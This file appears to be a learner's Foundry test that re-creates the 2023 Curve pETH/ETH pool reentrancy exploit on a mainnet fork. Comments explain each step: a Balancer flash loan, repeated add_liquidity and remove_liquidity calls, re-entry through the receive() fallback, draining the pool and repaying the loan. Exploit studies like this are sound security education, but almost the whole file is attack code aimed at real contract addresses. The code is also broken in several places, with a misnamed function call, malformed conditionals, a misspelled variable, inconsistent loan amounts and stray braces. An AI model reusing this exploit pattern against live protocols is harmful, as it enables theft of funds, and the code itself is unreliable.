// SPDX-License-Idendifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IWETH is IERC20 {
    function deposit() external payable;// this funtion is to deposit WETH to the contract
    function withdraw(uint256 amount) external;// this function is not payable
    


}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface ICurvePool {
    function get_balance() external view returns  (uint256[2] memory); // this is to get the balance of the pool
    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external payable returns (uint256); // this function is to exchange the tokens from the pool

    function add_liquidity(
        uint256[2] memory accounts,
        uint256  min_mint_amount
    ) external payable returns (uint256); // this function is to add liquidity to the pool

    function remove_liquidity(
        uint256 token_amount,
        uint256[2]  memory min_amounts
    ) external ; // this is the function that will remove liquidity from the general pool


}

// the WETH  interface simply an execution of the IERC20 wher it adds the deposit and the withdraw(amount ) function to go frome ETH to WETH and back, 
// this is needed because we will requise WETH from Balancer and need to convert it to ETH  and vice versa

// the BalancerVault interface exposes a single function  flashloan which we weill use to request a massinve flash loan from Balancer to conduch the exploit

// the curve pool interface exposes functions from the Curve Pool contract that will let us add and remove liquidity , swap tokens , and fetch the balance of tokes in the pool at a given point.




contract CurveHack is Test {
    IBalancerVault BalancerVault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ICurvePool CurvePool =
        ICurvePool(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    IWETH WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 pETH = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    IERC20 LPToken = IERC20(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);

    bool addLiquidityInReentrancy = true;

    /*
    NOTE 

    the LPToken and CurvePool contract addreses are the same because the CurvePoole is also an ERC20 contract
    and is rensposible for minting the LP Tokens to liquidity  providers as well we just treat them separately for better readability

    the boolean that has been set in the state variable is to check out reentrancy if it has been executed
    It will let us know whether we are in reentrancy or not and if we have the chance to re-enter the Curve Pool twice 



    */

    function setUp() public {
        vm.createSelectFork("mainnet", 17_806_055);
        // this function is just setting up the testing environment and let foundry knw we want to work on a forked version on the mainnet
        // vm cheat code will tell foundry to fork off mainned and we earlier provided an RPC URL  for mainnet in the foundry.toml file 
        // the second argument tells the block number to fork off from , and block number is one from right before the expoint happened , so we can reacreate the situation .


    }

    // lets create a helper function to pront a variety of values to out terminal console when running out test 

    // this will let us inspect the changes that are happening and help with understanding the frol of the attack

    function logValues(string memory key) internal {
        emit log_named_decimal_uint(
            string(abi.encode(key, ": Curve LP Total Supply")),
            LPToken.totalSupply(),
            LPToken.decimals()

        );// this emmit will get all the total supply of LP TOKENS

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Curve ETH Balance")),
            CurvePool.get_balance()[0],
            18
        ); // this emit will get us all the balances in ETH  of the curve pool


        emit log_named_decimal_uint(
            string(abi.encode(key, ": Curve pETH Balance")),
            CurvePool.get_balance()[1],
            pETH.decimals()
        );// this emit will get us all the balances in pETH of the curve pool   

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Attacker LP Balance")),
            LPToken.balanceOf(address(this)),
            LPToken.decimals()
        ); // this will get us all the balances in LP TOKENS of the attacker

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Attacker ETH Balance")),
            address(this).balance,
            18
        ); // this will give us the balance of the attacker in ETH

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Attacker pETH Balance")),
            pETH.balanceOf(address(this)),
            pETH.decimals()
        );// this emit will give use the balance of the attacker in pETH 
        
        emit 
        log("============================================");


    }// this function will print values in the terminal using the log_named_decimal_uint that foundry understands and interprates as an equivalend to trying to console.log a uint256 value 


    function  testHack() external {
        // foundry-specific function to reset ETH balance of this contract to 0
        deal(address(this),0);


        // tell the balancer we need 100000 weth from them 

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(WETH);
        amounts[0] = 100000;


        // request theflash loan 
        // this function call wil also call 'recieveFlashLoan'

        BalancerVault.flashloan(address(this), tokens, amounts, "");

        // by the time the above code will run and returns the flash loan , the balance of the pool should be 0 this means that it will be paid in full

        // the exploit will be complete 
        // we can now see how much  ETH  we still have left with , which is pure profits

        emit log_named_decimal_uint(
            "ETH in profits: ", 
            address(this).balance,
            18
        );


    }
    /*
    since we are trying to reverse engineer the exploit , and not "find " the bug ourselves

    let's looke at the removeLiquidity and add_liquidity function and we notice that both functions have @nonreentrant("lock") modifier applied on them - which is supposed to stop the re-entrance into either function when happening through  the other function but this other function is exactly what the vyper bug was 

    and with this it is possible to re-enter into add_liquidity twice throught the remove_liquidity function and with this is exactly what the hacker did


  

    
    */
    function receiveFlashLoan(
        address[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        // Convert the 80k WETH we have received to 80k ETH
        WETH.withdraw(WETH.balanceOf(address(this)));// this is to withdraw the WETH from the contract
    
        logValues("Before Add Liquidity #1");
    
        // Step 1. Add liquidity to pool
        uint256[2] memory addLiquidityAmounts = [
            uint256(100_000 ether), // 100k ETH
            uint256(0) // 0 pETH
        ];// here we are adding 100k ETH and 0 pETH to the pool
        CurvePool.add_liquidity{value: 100_000 ether}(
            addLiquidityAmounts,
            0
        );
    
        logValues("After Add Liquidity #1");
    // this whole code is to add liquidity to the pool and then remove it and the flash loan is to request a massinve flash loan from Balancer to conduch the exploit

    // remove liquidity from the pool 

    uint256[2] memory minAmountsReceived = [uint256(0), uint256(0)];
    uint256 lpTokenBalance = LPToken.balanceOf(address(this));
    CurvePool.remove_liquidity(lpTokenBalance, minAmountsReceived);
    logValues("After Remove Liquidity #1");

    // we now remove everything from the liquidity pool
    uint256 curvePoolLPTotalSupply = LPToken.totalSupply();
    uint256 myLPTokenSupply = LPToken.balanceOf(address(this));
    assert(myLPTokenSupply > curvePoolLPTotalSupply);

    uint256 liquidityToRemove = curvePoolLPTotalSupply - 1000 ether;
    CurvePool.remove_liquidity(liquidityToRemove, minAmountsReceived);

    logValues("After Remove Liquidity #2");

        // Swap any pETH to ETH
    pETH.approve(address(CurvePool), pETH.balanceOf(address(this)));
    CurvePool.exchange(1, 0, pETH.balanceOf(address(this)), 0);

    logValues("After swapping pETH for ETH");

        // Deposit ETH into WETH and pay back flash loan
    WETH.deposit{value: 80000 ether}();
    WETH.transfer(address(BalancerVault), 80000 ether);
    }
    }

    /*

    we have to look at the Curve contract ans see what happens 
    inside the remove_liquidity function , we first calculate the total_supply which is the amount of the LP tokens 
    in circulation and we will have to keep track of all this that is happening 
    for our reference we have to call it's initial value of total_suppel to be T_1
    Also we have to have a for loop that ranges over N_COINS where N_COINS = 2 (number of coins in the pool, i.e pETH and ETH)
    NOTE it does a raw_call which is native token transfer in the vyper land 

    by doing a raw_call the attacker now has the opportunity to execute aibitrary code from insider a recieve() function in their contract , which is exactly what we need to do 
    
    */

    receive() external payable {
        // only execute when it is called from the curve pool address that is provided
        if (msg.sender == address(CurvePool)) && addLiquidityInReentrancy {
            logValues("ReEntrancy - Before Add liquidity #2");
            

            // add liquidity to the pool again
            uint256[2] memory addLiquidityAmounts = [
                uint256(100_000 ether), // 100k ETH
                uint256(0) // 0 pETH
            ];

            CurvePool.add_liquidity{value: 100_000 ether}(
                addLiquidityAmounts,
                0
            );

            // we have mark the exploit as if it has happened and we do not have to do it again

            addLIquidityInReentrancy = false;
            logValues("ReEntrancy - After Add liquidity #2");
        }
        }
    }// now we have technically added 

}